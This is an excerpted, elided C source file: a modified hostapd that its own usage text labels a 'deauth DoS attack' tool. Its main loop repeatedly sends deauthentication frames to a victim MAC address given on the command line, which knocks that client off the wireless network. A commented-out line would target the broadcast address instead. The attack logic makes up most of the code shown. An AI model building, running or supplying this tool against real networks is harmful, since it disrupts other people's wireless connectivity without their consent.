...
static void hostapd_logger_cb(void *ctx, const u8 *addr, unsigned int module,
	...
	if (hapd && hapd->conf && addr)
		os_snprintf(format, maxlen, "%s: STA " MACSTR "%s%s: %s",
				hapd->conf->iface, MAC2STR(addr), module_str ? " " : "",
				module_str, txt);
		...
		os_snprintf(format, maxlen, "%s%s%s", module_str,
				module_str ? ": " : "", txt);
...
static struct hostapd_iface * hostapd_init(const char *config_file) {
	...
	hapd_iface->bss = os_calloc(conf->num_bss, sizeof(struct hostapd_data *));
	if (hapd_iface->bss == NULL)
		goto fail;

	for (i = 0; i < conf->num_bss; i++) {
		hapd = hapd_iface->bss[i] = hostapd_alloc_bss_data(hapd_iface, conf,
				&conf->bss[i]);
		if (hapd == NULL)
			goto fail;
		hapd->msg_ctx = hapd;
...
static void usage(void) {
	show_version();
	fprintf(stderr, "\n"
			"hostapd revised version for deauth DoS attack"
			"11/2013 by Hao");
...
int main(int argc, char *argv[]) {
	...
	u8 addr[6]; // Mac of viticm
	struct hostapd_data *hapd;
	hapd = interfaces.iface[0]->bss[0];

	for (;;) {
		int c = getopt(argc, argv, "DhS:B:d:s:t:m:T:l:p:");
		if (c < 0)
			break;
		switch (c) {
		case 'S':
			hapd->conf->ssid.ssid_len = strlen(optarg);
			if (hapd->conf->ssid.ssid_len > (sizeof(hapd->conf->ssid.ssid) - 1)
					|| hapd->conf->ssid.ssid_len < 1) {
				printf("Invalid SSID '%s'\n", optarg);
				usage();
			}
			//match_ssid = 1;
			strncpy(hapd->conf->ssid.ssid, optarg, hapd->conf->ssid.ssid_len);
			break;
		case 's':
			if (macstr2addr(optarg, addr)) {
	...
	for (;;) {
		...
		//os_memset(addr, 0xff, 6);
		hostapd_drv_sta_deauth(hapd, addr, 2); //WLAN_REASON_PREV_AUTH_NOT_VALID
	}

	out: hostapd_global_ctrl_iface_deinit(&interfaces);
